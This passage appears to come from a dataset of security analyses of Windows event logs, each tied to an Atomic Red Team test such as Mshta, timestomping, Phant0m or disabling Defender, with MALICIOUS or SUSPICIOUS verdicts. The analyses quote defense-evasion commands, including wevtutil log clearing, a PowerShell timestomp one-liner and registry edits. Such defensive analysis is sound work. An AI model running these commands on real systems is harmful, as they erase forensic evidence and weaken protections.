- **Potential Malware or Attacker Activity**: These actions align with typical attacker behaviors aiming to establish persistence and evade detection.

## Guidance on How to Proceed

- **Immediate Containment**: Isolate the affected host (`Server002`) from the network to prevent further unauthorized actions or lateral movement.
- **Comprehensive Log Analysis**: Retrieve and analyze any available backup logs or third-party monitoring solutions that might have records of these events.
- **Forensic Investigation**: Conduct a thorough forensic audit on `Server002` to uncover any malicious software or backdoors installed.
- **User Account Review**: Investigate the `admin_test` user account, considering password changes or disabling the account temporarily.
- **Security Policies**: Review and enforce strict security policies around log integrity, access controls, and PowerShell usage on all systems.

## Resolution

Given the identified behavior, the resolution for these logs is:

- **MALICIOUS**: The stated activities are consistent with efforts to manipulate logs, escalate privileges, and conduct operations indicative of compromised security, signaling confirmed malicious activity."
Mshta used to Execute PowerShell,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis and Observations:

1. **Log Clearing Activity**:
   - Multiple event log clearing activities are observed:
     - Application logs are cleared using `wevtutil.exe` with the command `wevtutil.exe cl Application` (EventID 1 and 5 in the Sysmon log).
     - System logs are cleared using `wevtutil.exe` with the command `wevtutil.exe cl System` (EventID 1 and 5 in the Sysmon log).
     - Security logs are cleared using `wevtutil.exe` with the command `wevtutil.exe cl Security` (EventID 1 in the Security log).
     - Windows PowerShell logs are cleared using `wevtutil.exe` with the command `wevtutil.exe cl Windows PowerShell` (EventID 104 in the System log).

2. **Process Execution**:
   - **MSHTA and PowerShell Execution**: The execution of a PowerShell process through an obfuscated manner using MSHTA (C:\Windows\System32\mshta.exe) to run a script with PowerShell that writes a simple message (`Write-Host Hello, MSHTA!`) after creating an HTA application is observed. This is potentially suspicious due to the use of `mshta.exe` for script execution, which is often an indicator of malicious activity.
   
3. **Time Manipulation**:
   - There is evidence of time changes on the host, as indicated by the Kernel-General EventIDs 1 and 24 and Security-Auditing EventID 4616. The system clock was set back by a few seconds and then restored to the correct time. This behavior can indicate an attempt to evade logging by manipulating timestamps.

4. **Unusual Process Invocation**:
   - The use of `cmd.exe` to execute `mshta.exe` in an obfuscated manner is an indicator of possible malicious scripting activity. The `cmd.exe` line is crafted to run a PowerShell script with minimal windows (`-nop`) which is a typical tactic used in attacks to reduce visibility.
   
5. **System Management**:
   - Legitimate system management tools like `wsmprovhost.exe` are used as parent processes for executing logs clearing and time modification activities. This could be used to blend in with normal system administration tasks.

### Suspicious Activities & Indicators:
- The logs exhibit classic signs of potentially suspicious activity, including:
  - **Clearing of Event Logs**: Clearing logs is typically associated with attempts to cover tracks following malicious activity.
  - **Execution of Scripts through MSHTA**: Using `mshta.exe` to run PowerShell scripts is a common technique used in cyber attacks.
  - **Time Manipulation**: Temporarily changing system time can indicate attempts to confuse logging systems or timing-based security controls.

### Assessment:

Based on the above findings, the Windows event logs indicate potentially **SUSPICIOUS** activity. The use of tools typically leveraged in attacks (like `mshta.exe` for PowerShell execution) combined with attempts to clear various logs warrants further investigation. The event logs suggest that an entity may be attempting to erase traces of its actions, which is a significant red flag for a potential compromise.

### Resolution:
- **SUSPICIOUS**: The activity within these logs requires more thorough investigation to confirm malicious intent or compromise. Immediate attention to inspecting further logs, systems, and possibly conducting a forensic analysis of the involved host is advised.

### Guidance:
- Investigate the source of the log-clearing commands.
- Validate changes to system time against known maintenance schedules.
- Check network logs and other endpoint logs for further indicators of compromise.
- Consider isolating the affected system for detailed analysis.
- Review user activity on `SERVER002\\admin_test` to determine if the actions were conducted by an authorized user or if the account could have been compromised."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"### Detailed Analysis of Logs:

Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity within the system. Below is a detailed breakdown of the suspicious and anomalous behaviors identified:

1. **Log Clearing Activity**:
   - **Security Log EventID 1102**: The Security event log indicates that the logs were cleared by the user `admin_test` on `2024-10-26 14:02:45`. Log clearing is often a tactic used by attackers to cover their tracks after performing malicious activities.
   - **System Log EventID 104**: It shows that the System logs and Windows PowerShell logs were also cleared by the same user (`admin_test`), further indicating the attempt to hide operations.

2. **Use of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` were executed with the `cl` (clear log) command line argument across different Windows Event Log channels (Sysmon, Application, System, Windows PowerShell). This widespread and simultaneous clearing of logs is highly irregular and suspicious.

3. **Suspicious PowerShell Activity**:
   - **Sysmon EventID 1**: A PowerShell command was executed with potentially malicious intent. The command `Invoke-ATHHTMLApplication` in the PowerShell execution suggests an attempt to execute a script via MSHTA, which is often used for executing malicious HTA files.
   - This is corroborated by the PowerShell log entries showing detailed CommandLine usage of `powershell.exe` with the script `Invoke-ATHHTMLApplication`, indicating potentially harmful action, likely aiming to perform lateral movement or further exploit execution.

4. **High Integrity and Elevated Privileges**:
   - Many processes are run under `High` integrity levels, indicative of administrative privilege use, especially concerning when combined with the `admin_test` user account activities.

5. **Processes Originating from Administrative User**:
   - Nearly all activities, including those executing potentially malicious scripts, originate from the `SERVER002\admin_test` account, which has administrative privileges on the system.

### Assessment:

The combined behaviors of extensive log clearing, suspicious PowerShell activities, and the administrative privileges used all strongly indicate malicious activity. These patterns are consistent with an attacker attempting to maintain stealth on a compromised system by hiding evidence of unauthorized actions.

### Guidance and Resolution:

- **Resolution**: MALICIOUS
- **Actions**:
  - **Immediate Incident Response**: Trigger the organization's incident response plan. This should include isolating the affected host to prevent further lateral movement or damage.
  - **Investigate `admin_test` Activities**: Perform a thorough investigation into actions performed by `admin_test`, especially external connections made and files modified or downloaded.
  - **Log Recovery**: If possible, recover deleted logs from backups to trace back further actions leading to the compromise.
  - **Forensic Analysis**: Conduct a full forensic investigation to identify potential malware payloads and the full scope of attacker objectives.
  - **Patch and Update**: Ensure all systems are up to date with the latest security patches to mitigate vulnerabilities.
  - **Review Security Policies**: Review and tighten security policies, especially around log management and administrative privileges.

The immediate containment and detailed analysis will help in understanding the attack vector and securing the infrastructure against future attacks."
Compiled HTML Help Local Payload,"Upon reviewing the provided logs, there are several areas that stand out as suspicious:

1. **Event Log Clearing**: There are multiple events (Event ID 1102 in the Security log, Event ID 104 in the System log) indicating that the Windows Event logs have been cleared. The user's name associated with this event is ""admin_test"". This action is highly indicative of malicious intent, as clearing of event logs is commonly done by attackers to cover their tracks after compromising a system.

2. **Suspicious Command Execution**: The Sysmon logs show multiple executions of `wevtutil.exe` with the command to clear logs (e.g., `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`). The user associated with these actions is also ""admin_test"". This aligns with the log clearing entries found in the Security and System logs, adding to the suspicion.

3. **Unusual Use of PowerShell**: There is evidence of PowerShell execution which can be legitimate, but in this context, coinciding with log clearing and other suspicious processes, it raises potential red flags.

4. **Execution of Potentially Malicious Tools**: The Sysmon log captures a process with the command line executing `cmd.exe` to run `hh.exe` from a temporary folder associated with ""AtomicRedTeam"", a known security testing framework. While this can be used for benign security testing by an authorized user, its presence alongside the log clearing entries suggests it needs further scrutiny to confirm legitimacy and ensure it wasn’t used maliciously.

5. **High-Privilege Process Execution**: There are several log entries (Event ID 4672) indicating the assignment of high-level privileges to the ""admin_test"" user, which may suggest privilege escalation activities.

### Assessment:
- The presence of log clearing activities combined with high-privilege process executions and the use of known security testing frameworks without explicit authorization or documentation strongly indicates suspicious, and potentially malicious, activity.

### Resolution:
- **SUSPICIOUS** - The activities noted within these logs are highly indicative of actions an attacker might take after gaining unauthorized access. Although it is not conclusively categorized as malicious without further context or evidence of direct harm or data exfiltration, the activities warrant an immediate and thorough investigation.

### Guidance:
1. **Immediate Investigation**: Conduct a deeper forensic analysis on the host in question (Server002) to uncover any malicious artifacts or unauthorized changes.
2. **Verify Recent Changes**: Correlate these events with any authorized security tests or administrative tasks to rule out false positives.
3. **Account Security**: Review access credentials for the ""admin_test"" account, look for signs of compromise, and ensure account activities are authorized.
4. **Audit Similar Activities**: Check for any similar patterns of activities across other hosts within the same network environment.
5. **Strengthen Monitoring**: Enhance real-time monitoring and set alerts for log clearing activities and suspicious command executions.
6. **Discuss with Relevant Teams**: Engage with IT and security teams to gather more context about scheduled tasks or maintenance activities around the time of these events."
Windows - Modify file creation timestamp with PowerShell,"Upon examining the provided event logs, several indicators suggest potentially malicious or suspicious activity. Here's a detailed breakdown of the findings:

### Key Observations:

1. **Presence of Atomic Red Team Activity:**
   - **PowerShell Activity:** The presence of PowerShell commands modifying file creation dates as demonstrated by the command `Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1551.006_timestomp.txt"" | % { $_.CreationTime = ""01/01/1970 00:00:00"" }`, suggests timestomping, a technique often used to hide malicious activity by altering file timestamps.

2. **Clearing Event Logs:**
   - The logs indicate that the `wevtutil.exe` command line utility was used to clear several event logs such as System (EventID 104), Windows PowerShell, and Security logs (EventID 1102). These actions are typically associated with attempts to cover tracks after or during malicious activity.

3. **High Integrity and SYSTEM Level Activities:**
   - Multiple processes, notably `PowerShell.exe` and `wevtutil.exe`, executed with high integrity levels, suggesting elevated privileges. This activity, combined with log clearing, strengthens the suspicion of malicious intent.

4. **Multiple Process Executions:**
   - Execution of typical Windows utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe`, appearing in close time proximity with PowerShell and log-clearing activities. While these tools alone are benign, their rapid sequence in conjunction with other activities may symbolize an attempt to perform reconnaissance or maintain persistence covertly.

5. **System Time Manipulations:**
   - The system time adjustments noted in the logs (EventID 4616 in the Security log) may align with attempts to synchronize time data associated with altered or cleared logs, further complicating detection efforts.

### Assessment of the Situation:

The logs exhibit a combination of sophisticated techniques commonly associated with adversarial operations, namely:
- Use of powerful scripting (PowerShell) for timestomping.
- Clearing event logs to hide evidence.
- Execution of commands at high integrity levels, indicating possible privilege escalation or exploitation.

### Resolution:
- **MALICIOUS**: The activities recorded in these logs are strongly indicative of malicious actions, most likely aligned with post-exploitation tactics of an adversary. The evidence presented, such as log clearing, timestamp alteration via PowerShell, and privileged process execution, do not align with typical benign administrative tasks without further context.

### Recommendations:
1. **Immediate Incident Response:**
   - Isolate the affected host from the network to prevent potential propagation or data exfiltration.
   - Perform a deep dive forensic investigation on the host to analyze further any persistence mechanisms, lateral movement, or data breaches.

2. **Review Access and Permissions:**
   - Evaluate user permissions, especially those for 'admin_test', to ensure only necessary access is granted.
   - Revoke or reset credentials that may be compromised.

3. **Strengthen Logging and Monitoring:**
   - Re-enable logging and improve security monitoring capabilities to detect similar behavior in the future.
   - Consider employing centralized logging solutions to reduce the impact of on-host log clearing.

4. **Security Awareness Training:**
   - Conduct training sessions for system administrators to increase awareness of such advanced tactics and encourage the adoption of best security practices.

By addressing these recommendations, the organization can enhance its defensive posture against future incidents of a similar nature."
Odbcconf.exe - Load Response File,"Upon analyzing the provided Windows event logs, a clear pattern of behavior emerges suggesting a potential security concern associated with the activities on Server002. Here's a detailed breakdown of identified suspicious or potentially malicious activities:

1. **Event Log Clearing**: 
   - **Security Log Event 1102 & System Log Event 104**: Both logs indicate that an account ""admin_test"" cleared event logs. Clearing security, system, or PowerShell logs can often be indicative of an attempt to hide malicious activity, as this action removes valuable forensic data trails.

2. **Process Executions with Elevated Privileges**:
   - Multiple events show processes performed by the user ""admin_test"" with high integrity levels, including potentially risky privileges like `SeDebugPrivilege`, which can be misused for privilege escalation.

3. **Scheduled Task or Command Execution Related to Atomic Red Team Testing**:
   - **Sysmon Logs and Command Line Execution**: The command execution involving `cmd.exe` with the Atomic Red Team artifact (`odbcconf.exe -f ""T1218.008.rsp""`) suggests exploit testing activity. Atomic Red Team is often used for red team activities to simulate attack techniques and assess defensive capabilities but should only be conducted in a controlled environment.

4. **Numerous System Executables Involvement**:
   - High-frequency invocation of system executables (like `wevtutil.exe`, `conhost.exe`, etc.) in tandem with event log clearing operations suggests automation typical in scripted or programmed processes aimed at manipulating system state or concealing actions.

5. **Excessive Edge Update Installations**:
   - The frequent Microsoft Edge installer process executions, often seen with verbose logging and other flags, do not conform with standard administrative operations, being potentially used as a decoy to mask other activities.

Given these multiple suspicious indications — particularly the log clearance events, the execution of potentially risky commands, and the systematic invocation of system-level processes — the collected logs indicate the presence of significant anomalous activity.

**Resolution**: **SUSPICIOUS**

**Recommendations**:
- Conduct a thorough review examining the ""admin_test"" account: validate its legitimacy, purpose, and ensure it follows best practice configurations.
- Review scheduled tasks and software installation policies for unauthorized configurations.
- Verify and, if necessary, enhance logging policies to prevent or rapidly detect unauthorized log clearance actions.
- Consider network isolation for Server002 until further investigations affirm or dispel suspicions.
- Increase monitoring and assess whether additional host or network-based defense measures are required to detect such activities promptly in the future."
Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"Based on the provided event logs, let's break down the analysis and identify the significant points of interest:

### Key Observations:

1. **Log Clearing Events:**
   - Multiple log files have been cleared (sysmon, system, Windows PowerShell, and security) shortly before or at the same time. This includes:
     - Sysmon log: Entries indicating ""cl Microsoft-Windows-Sysmon/Operational"".
     - System log: Event IDs 104 indicate that the system and Windows PowerShell event logs were cleared by ""admin_test"".
     - Security log: Event ID 1102 indicates the security log was cleared by ""admin_test"".

2. **Use of Wevtutil:**
   - The use of `wevtutil.exe` is noted for clearing logs. The specific command to clear (""cl"") is suspicious as it suggests log tampering.

3. **Registry Modification:**
   - There's a registry modification via `cmd.exe /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f`. This command disables external device sign-on.

4. **Miscellaneous Activities:**
   - Microsoft Edge Update processes running with `SYSTEM` integrity are noted. These seem to be legitimate software updates.
   - Hostname and whoami commands executed, which could either be benign administrative checks or preliminary reconnaissance.

### Assessment:

- **Log Clearing** is a significant red flag indicating potential malicious activity. Cleared logs can be an attempt to cover tracks, which is a common tactic used during unauthorized access or post-compromise actions.
- **Registry Modifications** may suggest a configuration change that aligns with security bypass techniques, especially modifying FIDO policies which may affect authentication methods.
- **Tool Execution and Chain of Processes**: The execution pattern of native Windows utilities (e.g., `wevtutil`, `cmd`, `reg`) combined with log clearing suggests significant risk, often associated with malicious activities to alter the system's state clandestinely.

### Resolution:

Based on the analysis of these logs, the activity appears to be **MALICIOUS** due to the following evidence:
- System logs, sysmon, PowerShell, and security logs cleared by the same user/admin_test, which is often indicative of an attempt to hide malicious activities, as well as the use of wevtutil for log clearing.
- Unusual registry modifications that may have security implications.
- The confluence of events occurring in a coordinated timeframe indicates both a high level of privilege and potentially harmful intentions.

   - Isolate the affected host (Server002) from the network to prevent potential spread or data exfiltration.
   - Gather full disk images and memory captures for detailed forensic analysis.
   - Review authentication logs for unusual login behavior by ""admin_test"".

2. **Investigate:**
   - Investigate `admin_test` account usage to identify possible compromise or misuse.
   - Verify the recent activities of `wevtutil`, `cmd.exe`, and other related executions.

3. **Mitigation:**
   - Consider resetting passwords for any suspected compromised accounts.
   - Enhance logging and monitoring, especially for privileged accounts.
   - Conduct a thorough investigation for backdoors or additional compromises following initial log cleaning.

4. **Long-Term Actions:**
   - Review security policies regarding registry changes and update mechanisms.
   - Implement stricter access controls and audit capabilities on administrative actions."
Disable Defender Using NirSoft AdvancedRun,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity and the context around these activities can be drawn. Let's go through the logs to elucidate suspicious activities:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing Activity (Event ID 1102, 104):**
   - Multiple logs with the Event ID 1102 in the Security log and 104 in the System log indicate that logs were cleared. This is often a sign of cover activity performed by attackers to eliminate traces of unauthorized actions. The user `SERVER002\admin_test` is executing these clear commands.
   - Relevant Commands in Sysmon Log:
     ```
     ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""
     ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""
     ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""
     ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""
     ```

2. **Execution of Potentially Malicious PowerShell Command:**
   - A PowerShell command aimed at stopping Windows Defender (`stop WinDefend`) via `sc.exe` using `AdvancedRun.exe`, indicates an attempt to disable security measures.
   - The PowerShell command also attempts to remove the Windows Defender directory using an `rmdir` command. This behavior implies malicious intent aimed at undermining system security.

3. **Use of NirSoft's AdvancedRun (an external payload):**
   - Execution through `AdvancedRun.exe` to execute system-level commands such as stopping Windows Defender suggests the use of sophisticated tools to carry out potentially harmful tasks. This further solidifies the malicious intent since NirSoft tools can be used for auditing but also misused by threat actors.

4. **Processes executed under high integrity level and by an administrative account:**
   - Processes such as `cmd.exe`, `wevtutil.exe`, and `WindowsPowerShell` run under high integrity and administrative privileges. This may indicate privilege escalation or misuse of administrative privileges.

### Conclusion:

- The sequence of log clear events, sophisticated PowerShell commands designed to disable a key security component (Windows Defender), and utilization of external payloads through administrative permissions collectively indicate a methodical attempt to compromise the system's security posture.
  
- **Assessment of Situation:**
  - The actions above are unmistakably indicative of malicious activity. The clearing of logs, particularly Security logs, together with attempts to disable key protective mechanisms like Windows Defender, go beyond standard administrative functions and align with adversarial tactics.

### Resolution:
The logs contain evidence of malicious activity. Actions have been taken to not only execute potentially harmful commands but also to erase their trace, evidencing clear malicious intent.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Termination**: Immediately isolate the host (""Server002"") from the network to prevent any further malicious actions.
2. **Forensic Analysis**: Conduct further in-depth forensic analysis to gather more evidence, understand the full scope of the compromise, and identify potentially additional affected systems or accounts.
3. **Revocation of Access Privileges**: Audit and remove any suspicious accounts or administrative privileges that may have been exploited.
4. **Remediation Steps**: Re-enable and ensure all security measures are operational, including Windows Defender.
5. **Review and Harden**: Review logs, system configurations, and access controls to enhance security posture and reduce the likelihood of future incidents.
6. **Incident Reporting and Legal Coordination**: Report the incident to relevant legal and regulatory bodies if required, following internal incident response procedures.

It is essential to take these measures promptly to mitigate the present threat and prevent further exploitation."
Modify UsePIN Registry entry,"In analyzing the given logs, a few critical observations emerge that suggest potential suspicious or malicious activity:

1. **Event Log Clearance**: Multiple entries indicate that logs across different channels (System, Windows PowerShell, Security) on `Server002` were cleared within a very short time frame. This action was done using the `wevtutil.exe` command line utility, executed by a user with the ID `admin_test`. The clearing of event logs, especially when done across key logs such as Security and System, can be a common tactic used by an attacker to cover their tracks following malicious activity.

2. **Command Line Registry Edit**: There is an execution of `cmd.exe` followed by `reg.exe` to add a registry entry concerning BitLocker policies (`HKLM\SOFTWARE\Policies\Microsoft\FVE`). This command (`reg add ...`) with administrative privileges could indicate an attempt to modify security settings to either facilitate further unauthorized actions or to disable system protections without administrator permission.

3. **Recurrent Microsoft Edge Update Executions**: Across the logs, there's repetitive activity involving `MicrosoftEdgeUpdate.exe`, often seen in conjunction with `MicrosoftEdgeUpdateComRegisterShell64.exe`. While updates and associated activities occur routinely, their inclusion among other suspicious activities, like log clearance, raises questions about whether this process might have been tampered with or exploited.

4. **Time Manipulation Events**: There are `Security` and `System` log entries (Event IDs `4616`) indicating the system clock was adjusted. Often, time modifications can be benign (stemming from NTP corrections), but in the context of log clearances and registry tweaks, it adds to the circumstantial evidence that suggests covering tracks or aligning time for certain operations to avoid detection.

**Assessment**:
- The combination of event log tampering, alteration of security-related registry settings, and the unusual clustering of Microsoft Edge update executions aligns with recognized patterns of post-compromise activity.
- The presence of `admin_test` involved in all log clearance actions significantly increases the risk profile, particularly if this user’s usual behaviors are inconsistent with the activities observed.

**Resolution**:
- **MALICIOUS**: These logs point convincingly to activities that imply deliberate attempts to alter system settings and cover tracks, typical of a compromised host attempting to evade detection.

**Guidance on How to Proceed**:
1. Immediately isolate the affected host from the network to prevent further risk while conducting a thorough investigation.
2. Conduct a deep audit of the user `admin_test` activities, including recent login history and access rights validation to ensure legitimacy.
3. Analyze the system for indicators of persistence (e.g., new services, scheduled tasks) possibly stemming from the registry changes.
4. Review and restore log integrity from backups if available to assess further surrounding events that may indicate compromise methods or pathways.
5. Determine the legitimacy of Microsoft Edge Update activities; consider if these were scheduled updates or potentially injected/tampered processes.
6. Ensure all security controls and logging mechanisms are operational and remain vigilant for further anomalies post-resolution."
Makes Eventlog blind with Phant0m,"Upon reviewing the provided Windows event logs, several entries indicate potentially suspicious behavior that requires further investigation:

### Suspicious or Anomalous Behavior:

1. **Log Clearing Actions:**
   - There are multiple instances of the `wevtutil.exe` command being used to clear logs, captured in both the System and Sysmon logs (e.g., Sysmon Event ID 1 and 5 entries for `wevtutil.exe`). Specifically, logs for the System, Application, and Windows PowerShell channels were cleared around `2024-10-28 11:20:59`.
   - Clearing logs may indicate an attempt to hide actions performed by an attacker on the system.

2. **Execution of Phant0m.exe:**
   - The process `cmd.exe` executed `Phant0m.exe` from a directory typically associated with Atomic Red Team simulations (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1562.002\bin\Phant0m.exe`).
   - This executable is known for its capability to evade detection by tampering with Event Tracing for Windows (ETW).

3. **Use of Administrative Tools:**
   - Processes like `whoami.exe`, `hostname.exe`, and `cmd.exe` executing with high integrity levels suggest enumeration and possibly preparatory actions for privilege escalation or lateral movement.
   - These utilities are not inherently malicious, but their usage, especially in conjunction with log clearing, could indicate suspicious activity.

4. **Repeated Logon Events:**
   - Event ID 4624 (logon type 5, which indicates a service logon) associated with the SYSTEM account may be benign operational processes, but patterns should be analyzed to discern if this is unusual activity for this particular day or time.

### Assessment and Resolution:

**Assessment:**
- The combination of cleared logs and the execution of utilities related to ETW tampering strongly suggests potential malicious activity designed to obfuscate actions on the host.
- The presence of tools associated with Atomic Red Team indicates that these actions might either be part of a security exercise or a mimic by a malicious actor using widely known simulation techniques and tools.
- Without additional context (e.g., whether any security testing was scheduled), this behavior is highly suspicious.

**Guidance:**
1. Verify if Phant0m.exe execution was part of an authorized security exercise.
2. Check for recent changes to user privileges and any unauthorized accounts that might have been created or used during this timeframe.
3. Review system integrity and look for any further signs of lateral movement indicators on other systems in the network.
4. Implement additional monitoring and logging to capture any further anomalies while the investigation is ongoing.

**Resolution: SUSPICIOUS**
- The activity outlined indicates patterns that definitely warrant further investigation by the security team, as it aligns with tactics commonly used during malicious activities to cover tracks and prepare for lateral movement."
Hide Files Through Registry,"### Assessment:

Upon reviewing the provided logs, several observations indicate potential suspicious activity:

1. **Log Clearing Activity**: 
   - Events 104 and 1102 indicate that the event logs, including System, Windows PowerShell, and Security logs, were cleared by the user ""admin_test"". This is generally suspicious behavior as attackers often clear event logs to cover their tracks during or after a malicious activity.

2. **Command-Line Utility Usage**:
   - Multiple instances of `wevtutil.exe` (a command-line tool used for managing Windows event logs) are observed, specifically to clear event logs. For example, the command line `""C:\\Windows\\system32\\wevtutil.exe"" cl System` was executed. The execution of this utility in combination with log clearing events strongly suggests an attempt to erase traces of activities.

3. **Privileged Operations**:
   - The execution of potentially harmful command line operations including the use of `cmd.exe` to modify registry values (`reg add ...`) by the user ""admin_test"" with high integrity shows possible unauthorized attempts to change system settings that can impact system behavior.

4. **Time Manipulation**:
   - Time change events (EventID 4616) logged in the Security and System logs highlight that system time was altered by ""LOCAL SERVICE"" using `svchost.exe`. This could indicate an attempt to manipulate timestamps for further malicious purposes.

5. **Unusual Execution Contexts**:
   - `svchost.exe` executing in contexts like time service adjustments without clear justification could be a red flag, although svchost by itself is a legitimate Windows process that hosts various services.

6. **High Integrity Level Commands**:
   - Actions being performed with high integrity levels imply administrative rights, crucial for the mentioned activities, and suggest the actor had elevated privileges.

7. **Edge Update Activities**:
   - The `MicrosoftEdgeUpdate.exe` processed frequently in the logs, but this appears benign as it's consistent with a legitimate update sequence for the Microsoft Edge browser.

### Conclusion and Resolution:

The logs contain numerous indicators that may suggest potentially malicious activities due to the systematic clearing of logs, registry modifications, and time manipulation, executed with administrative rights. Although some events may align with benign activities during a maintenance window, the combination and pattern of these events are concerning.
 
### Resolution: **SUSPICIOUS**

Considering the context and sequence of observed activities, this case is marked as **SUSPICIOUS**. Further investigation is recommended to validate whether these actions were authorized or part of a maintenance schedule, or indeed malicious in nature. This should include:

1. Contacting the user ""admin_test"" to verify if these actions were intentional or known, and to understand if there was a legitimate reason for the activities.
2. Reviewing any security policies or scripts that could have triggered such actions.
3. Conducting a thorough inspection of the host for any signs of unauthorized access or other anomalies.
4. Monitoring for similar activities or alerts on other systems within the network."
Disable Windows Auto Reboot for current logon user,"Upon analyzing the provided Windows event logs, the following findings and observations can be made:

1. **Log File Clearance:**
   - Several `wevtutil.exe` processes were used to clear logs, indicating that the System, Security, and Windows PowerShell logs were cleared by the user `admin_test`. 
   - Events confirming log clearance include:
     - Event ID 104 (System log): Indicates clearing of Windows event logs.
     - Event ID 1102 (Security log): Security logs were cleared.
   These actions, especially occurring at almost the same time, are frequently associated with malicious attempts to hide traces by attackers. While this could also be due to administrative actions, the simultaneous clearance of multiple logs is concerning.

2. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is a legitimate Windows utility for managing event logs, but it being used to clear logs, especially multiple ones, could be considered suspicious unless justified by necessary administrative tasks.

3. **Command Execution:**
   - A `cmd.exe` process was observed executing a command that modifies Windows Update behavior (reg add command). While this might sometimes be a legitimate configuration change, without a clear justification, it suggests potential tampering with system update settings.

4. **Processes with High Integrity Level:**
   - Processes such as `wevtutil.exe` and `cmd.exe` have run with a High integrity level. This level of access provides significant control over the system, which could be risky if not authorized.

5. **Process Patterns:**
   - The process pattern in these logs shows the intense activity of clearing logs across multiple channels in a short period. Using command line processes like `cmd.exe` further supports potentially unauthorized or suspicious actions.

6. **Background Activity:**
   - The Sysmon log entries show numerous executions related to Microsoft Edge Update occurring under the `NT AUTHORITY\SYSTEM` user context. While system updates can generate similar patterns, they add noise to the logs rather than appearing directly indicative of an attack.

**Assessment:**
Given the simultaneous clearing of event logs, the use of administrative tools like `wevtutil.exe` to erase logs across multiple channels, and command execution to modify system settings, these activities raise significant suspicion. While there may be benign reasons for log clearance, such an act typically accompanies attempts to cover tracks of illicit actions.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Immediate Investigation:**
   - Verify the authorization and context for log cleaning.
   - Confirm if `admin_test` is a legitimate user with rights to clear logs and if these actions were intentional and documented.

2. **Threat Hunting:**
   - Search for potential suspicious behavior in other logs or associated systems.
   - Check for any unusual user activity that could tie in with this behavior.

3. **Security Measures:**
   - Re-enable logging for affected logs and enforce stricter monitoring for administrative actions.
   - Ensure system policies restrict arbitrary log file clearance.

4. **Reviewing Permissions:**
   - Evaluate and possibly restrict access rights for tools capable of clearing logs, such as `wevtutil.exe`.
   - Reinforce elevated privilege use policies.

5. **Report and Escalation:**
   - Provide an in-depth report to incident response or security operations teams, and consider elevating the issue for further analysis and potential containment measures.

The logs present suspicious behavior warranting a comprehensive investigation to prevent or trace potential malicious activity."
Windows HideSCANetwork Group Policy Feature,"Upon reviewing the provided Windows event logs, there are multiple signs of potentially suspicious and malicious activity. Here's a detailed breakdown:

1. **Execution of System Utility Tools:**
   - There are numerous executions of system utilities such as `wevtutil.exe`, `cmd.exe`, and `reg.exe`. The `wevtutil.exe` command is frequently used to clear event logs, which is an indicator of potential malicious activity, as attackers often clear logs to cover their tracks.
   - Specifically, `wevtutil.exe` is used with the command-line argument to clear specific logs, such as:
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`

2. **Registry Modification Command:**
   - The log also indicates the execution of a `cmd.exe` process with a command to modify the registry: 
     `\""cmd.exe\"" /c reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v HideSCANetwork /t REG_DWORD /d 1 /f`. 
   - This command alters the registry to potentially hide network connections, which could indicate a tactic to evade detection or hide malicious activity.

3. **Log Clearing Events:**
   - The Security and System logs show clearance events (`EventID: 1102` in Security and `EventID: 104` in System) executed by `admin_test`, which is consistent with the logs being cleared using `wevtutil.exe`.
   - Log files being cleared without backups is a clear indication of suspicious activity, likely attempting to remove traces of malicious actions.

4. **Repeated Execution of Update Services:**
   - The logs show multiple instances related to `MicrosoftEdgeUpdate.exe` and its components, which could be normal, but the timing and frequency could suggest a repeat attempt of a particular action that might be suspicious if not properly vetted.

5. **Suspicious Process Execution:**
   - The repeated launching of `conhost.exe`, often seen as a child of `cmd.exe` or during the execution of command-line operations, aligns with attempts to run command prompt commands.

**Assessment:**
Considering these indicators, the activities observed in this set of logs suggest malicious intent, primarily relating to system and log manipulation tactics,
likely an attempt to hide potentially unauthorized actions. Executions that involve registry editing and system log clearing without documentation strongly suggest an attempt to cover tracks.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- Immediate steps should include isolating the affected system to prevent further potential damage or spreading of unwanted changes.
- Conduct a full forensic analysis on the system to understand the full extent of the compromise, including any malware present.

- Take steps to review and strengthen security operations regarding log monitoring and sysadmin practices to prevent recurring incidents."
Execution from Compressed File,"Upon reviewing the provided logs, several points of interest and potential indicators of compromise have been identified. Here's the detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Clearing Event Logs:**
   - The Security log shows event ID 1102 for ""LogFileCleared"" at `2024-10-21 11:47:01.8499856`, with the `SubjectUserName` being `admin_test`. This indicates that the Windows Security event log was cleared, which is a common technique used by malicious actors to cover their tracks.

2. **Wevtutil Executions:**
   - Sysmon logs show several executions of `wevtutil.exe`, a command-line utility that allows users to manage event logs, with commands targeting different channels such as Sysmon, Application, and System. The commands observed are: 
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
